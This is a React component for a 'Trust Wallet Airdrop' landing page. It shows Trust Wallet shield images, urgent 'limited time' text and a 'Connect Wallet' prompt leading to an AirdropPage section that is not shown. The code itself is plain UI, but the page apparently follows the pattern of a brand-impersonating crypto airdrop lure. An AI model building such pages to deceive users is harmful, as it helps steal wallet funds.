import { useEffect } from 'react'
import { useLocation } from 'react-router-dom'
import { IoArrowDown } from 'react-icons/io5'
import AirdropPage from '../AirdropPage/AirdropPage'
import trustShield from '../../assets/trust-shield.png'

function LandingPage() {
  const location = useLocation()

  const scrollToAirdrop = () => {
    document.getElementById('airdrop')?.scrollIntoView({ behavior: 'smooth' })
  }

  useEffect(() => {
    if (location.pathname === '/airdrop') {
      window.requestAnimationFrame(scrollToAirdrop)
    }
  }, [location.pathname])

  return (
    <main className="landing-page">
      <div className="landing-stage" aria-label="Trust Wallet airdrop">
        <span className="landing-cursor landing-cursor-top" aria-hidden="true" />
        <span className="landing-cursor landing-cursor-side" aria-hidden="true" />

        <div className="landing-orbit" aria-hidden="true">
          <span className="landing-orbit-ring" />
          <img className="landing-shield landing-shield-primary" src={trustShield} alt="" />
        </div>

        <img className="landing-shield landing-shield-small" src={trustShield} alt="" />
        <img className="landing-shield landing-shield-tiny" src={trustShield} alt="" />

        <section className="landing-copy">
          <p>Limited time event.</p>
          <h1>Trust Wallet Airdrop</h1>
          <span>
            Our airdrop campaign is now live! Connect your wallet below to check
            your eligibility.
          </span>
          <button type="button" onClick={scrollToAirdrop}>
            Connect Wallet
          </button>
        </section>

        <div className="landing-next" aria-hidden="true">
          <IoArrowDown />
        </div>
      </div>

      <AirdropPage asSection id="airdrop" />
    </main>
  )
}

export default LandingPage
